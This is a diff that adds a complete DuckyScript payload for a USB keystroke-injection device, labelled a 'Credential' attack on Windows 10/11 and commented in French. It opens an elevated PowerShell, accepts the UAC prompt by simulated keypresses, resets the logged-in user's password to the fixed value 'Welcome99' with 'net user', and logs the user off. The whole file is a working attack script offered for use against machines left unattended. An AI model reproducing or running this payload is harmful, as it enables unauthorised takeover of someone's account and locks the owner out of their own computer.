@@ -1,0 +1,31 @@
+REM ####################################################################################
+REM #                                                                                  |
+REM # Title        : MDP Change                                                        |
+REM # Author       : Miiraak                                                           |
+REM # Version      : 1.0                                                               |
+REM # Category     : Credential                                                        |
+REM # Target       : Windows 10/11                                                     |
+REM #                                                                                  |
+REM ####################################################################################
+
+REM Requirements:
+REM     - Admin PowerShell
+
+REM Description:
+REM     - Ouvre un PowerShell en admin.
+REM     - Change le mot de passe de l'utilisateur.
+REM     - Déconnecte l'utilisateur.
+
+REM Ouvre un PowerShell en admin.
+DEFAULT_DELAY 500
+GUI r
+STRING powershell
+CTRL-SHIFT ENTER
+LEFT
+ENTER
+
+REM Change le mot de passe.
+STRINGLN net user $env:USERNAME Welcome99
+
+REM Deconnecte l'utilisateur.
+STRINGLN shutdown -l
